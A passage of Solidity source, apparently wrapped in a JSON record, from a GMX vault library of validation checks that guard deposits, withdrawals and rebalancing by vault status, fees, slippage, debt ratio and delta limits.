GMXTypes.Status.Open)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n\n    if (self.depositCache.depositParams.executionFee < self.minExecutionFee)\n      revert Errors.InsufficientExecutionFeeAmount();\n\n    if (!self.vault.isTokenWhitelisted(self.depositCache.depositParams.token))\n      revert Errors.InvalidDepositToken();\n\n    if (self.depositCache.depositParams.amt == 0)\n      revert Errors.InsufficientDepositAmount();\n\n    if (self.depositCache.depositParams.slippage < self.minSlippage)\n      revert Errors.InsufficientSlippageAmount();\n\n    if (depositValue == 0)\n      revert Errors.InsufficientDepositAmount();\n\n    if (depositValue < MINIMUM_VALUE)\n      revert Errors.InsufficientDepositAmount();\n\n    if (depositValue > GMXReader.additionalCapacity(self))\n      revert Errors.InsufficientLendingLiquidity();\n  }\n\n  /**\n    * @notice Checks before processing deposit\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessDepositChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after deposit\n    * @param self GMXTypes.Store\n  */\n  function afterDepositChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: revert if lpAmt did not increase at all\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore)\n      revert Errors.InsufficientLPTokensMinted();\n\n    // Guards: check that debt ratio is within step change range\n    if (!_isWithinStepChange(\n      self.depositCache.healthParams.debtRatioBefore,\n      GMXReader.debtRatio(self),\n      self.debtRatioStepThreshold\n    )) revert Errors.InvalidDebtRatio();\n\n    // Slippage: Check whether user received enough shares as expected\n    if (\n      self.depositCache.sharesToUser <\n      self.depositCache.depositParams.minSharesAmt\n    ) revert Errors.InsufficientSharesMinted();\n  }\n\n  /**\n    * @notice Checks before processing deposit cancellation\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessDepositCancellationChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after deposit check failure\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterDepositFailureChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after deposit failure's liquidity withdrawn\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterDepositFailureLiquidityWithdrawal(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Deposit_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before vault withdrawal\n    * @param self GMXTypes.Store\n\n  */\n  function beforeWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Open)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n\n    if (!self.vault.isTokenWhitelisted(self.withdrawCache.withdrawParams.token))\n      revert Errors.InvalidWithdrawToken();\n\n    if (self.withdrawCache.withdrawParams.shareAmt == 0)\n      revert Errors.EmptyWithdrawAmount();\n\n    if (\n      self.withdrawCache.withdrawParams.shareAmt >\n      IERC20(address(self.vault)).balanceOf(self.withdrawCache.user)\n    ) revert Errors.InsufficientWithdrawBalance();\n\n    if (self.withdrawCache.withdrawValue < MINIMUM_VALUE)\n      revert Errors.InsufficientWithdrawAmount();\n\n    if (self.withdrawCache.withdrawParams.slippage < self.minSlippage)\n      revert Errors.InsufficientSlippageAmount();\n\n    if (self.withdrawCache.withdrawParams.executionFee < self.minExecutionFee)\n      revert Errors.InsufficientExecutionFeeAmount();\n\n    if (self.withdrawCache.withdrawParams.executionFee != msg.value)\n      revert Errors.InvalidExecutionFeeAmount();\n  }\n\n  /**\n    * @notice Checks before processing vault withdrawal\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after token withdrawal\n    * @param self GMXTypes.Store\n  */\n  function afterWithdrawChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: revert if lpAmt did not decrease at all\n    if (GMXReader.lpAmt(self) >= self.withdrawCache.healthParams.lpAmtBefore)\n      revert Errors.InsufficientLPTokensBurned();\n\n    // Guards: revert if equity did not decrease at all\n    if (\n      self.withdrawCache.healthParams.equityAfter >=\n      self.withdrawCache.healthParams.equityBefore\n    ) revert Errors.InvalidEquityAfterWithdraw();\n\n    // Guards: check that debt ratio is within step change range\n    if (!_isWithinStepChange(\n      self.withdrawCache.healthParams.debtRatioBefore,\n      GMXReader.debtRatio(self),\n      self.debtRatioStepThreshold\n    )) revert Errors.InvalidDebtRatio();\n\n    // Check that user received enough assets as expected\n    if (\n      self.withdrawCache.tokensToUser <\n      self.withdrawCache.withdrawParams.minWithdrawTokenAmt\n    ) revert Errors.InsufficientAssetsReceived();\n  }\n\n  /**\n    * @notice Checks before processing withdrawal cancellation\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessWithdrawCancellationChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after withdrawal failure\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterWithdrawFailureChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before processing after withdraw failure's liquidity added\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessAfterWithdrawFailureLiquidityAdded(\n    GMXTypes.Store storage self\n  ) external view {\n    if (self.status != GMXTypes.Status.Withdraw_Failed)\n      revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks before rebalancing\n    * @param self GMXTypes.Store\n    * @param rebalanceType GMXTypes.RebalanceType\n  */\n  function beforeRebalanceChecks(\n    GMXTypes.Store storage self,\n    GMXTypes.RebalanceType rebalanceType\n  ) external view {\n    if (\n      self.status != GMXTypes.Status.Open &&\n      self.status != GMXTypes.Status.Rebalance_Open\n    ) revert Errors.NotAllowedInCurrentVaultStatus();\n\n    // Check that rebalance type is Delta or Debt\n    // And then check that rebalance conditions are met\n    // Note that Delta rebalancing requires vault's delta strategy to be Neutral as well\n    if (rebalanceType == GMXTypes.RebalanceType.Delta && self.delta == GMXTypes.Delta.Neutral) {\n      if (\n        self.rebalanceCache.healthParams.deltaBefore < self.deltaUpperLimit &&\n        self.rebalanceCache.healthParams.deltaBefore > self.deltaLowerLimit\n      ) revert Errors.InvalidRebalancePreConditions();\n    } else if (rebalanceType == GMXTypes.RebalanceType.Debt) {\n      if (\n        self.rebalanceCache.healthParams.debtRatioBefore < self.debtRatioUpperLimit &&\n        self.rebalanceCache.healthParams.debtRatioBefore > self.debtRatioLowerLimit\n      ) revert Errors.InvalidRebalancePreConditions();\n    } else {\n       revert Errors.InvalidRebalanceParameters();\n    }\n  }\n\n  /**\n    * @notice Checks before processing of rebalancing add or remove\n    * @param self GMXTypes.Store\n  */\n  function beforeProcessRebalanceChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    if (\n      self.status != GMXTypes.Status.Rebalance_Add &&\n      self.status != GMXTypes.Status.Rebalance_Remove\n    ) revert Errors.NotAllowedInCurrentVaultStatus();\n  }\n\n  /**\n    * @notice Checks after rebalancing add or remove\n    * @param self GMXTypes.Store\n  */\n  function afterRebalanceChecks(\n    GMXTypes.Store storage self\n  ) external view {\n    // Guards: check that delta is within limits for Neutral strategy\n    if (self.delta == GMXTypes.Delta.Neutral) {\n      int256 _delta = GMXReader.delta(self);\n\n      if (\n        _delta > self.deltaUpperLimit ||\n        _delta < self.deltaLowerLimit\n      ) revert Errors.InvalidDelta();\n    }"
    }
  ]
}